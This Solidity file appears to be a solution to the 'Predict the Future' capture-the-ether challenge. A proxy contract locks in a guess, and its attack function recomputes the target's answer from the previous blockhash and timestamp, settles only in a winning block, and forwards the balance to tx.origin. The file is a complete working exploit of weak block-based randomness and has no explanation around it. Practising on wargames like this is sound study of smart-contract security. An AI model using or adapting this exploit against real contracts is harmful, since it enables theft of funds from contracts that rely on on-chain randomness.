pragma solidity ^0.7.4;

// import "hardhat/console.sol";


interface IPredictTheFutureChallenge {
    function isComplete() external view returns (bool);
    function lockInGuess(uint8 n) external payable;
    function settle() external; 
}

contract PredictTheFutureProxy {
    function guess(address _targetAddr) external payable {
        require(msg.value == 1 ether);

        IPredictTheFutureChallenge target = IPredictTheFutureChallenge (_targetAddr);
        target.lockInGuess{value: 1 ether}(5);
    }

    function attack(address _targetAddr) external payable {
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
        IPredictTheFutureChallenge target = IPredictTheFutureChallenge (_targetAddr);
        
        // console.log(answer);

        require(answer == 5, "not in this block");
        target.settle();

        tx.origin.transfer(address(this).balance);
    }
    
    receive() external payable {}
}